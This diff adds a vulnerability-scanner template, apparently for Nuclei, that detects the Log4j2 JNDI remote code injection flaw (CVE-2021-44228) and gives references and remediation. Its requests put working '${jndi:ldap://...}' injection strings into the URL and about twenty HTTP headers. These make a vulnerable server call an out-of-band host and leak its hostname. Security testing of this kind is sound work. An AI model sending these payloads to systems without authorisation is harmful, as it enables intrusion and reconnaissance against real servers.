@@ -1,0 +1,81 @@
+id: CVE-2021-44228
+
+info:
+  name: Apache Log4j2 Remote Code Injection
+  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
+  severity: critical
+  description: |
+    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  tags: cve,cve2021,rce,oast,log4j,injection,kev
+
+requests:
+  - raw:
+      - |
+        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
+        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
+        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
+        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
+        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
+        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
+        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
+        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
+        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
+        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
+        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
+        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
+        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
+        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
+        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
+        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
+        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
+        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+
+# Enhanced by mp on 2022/02/28
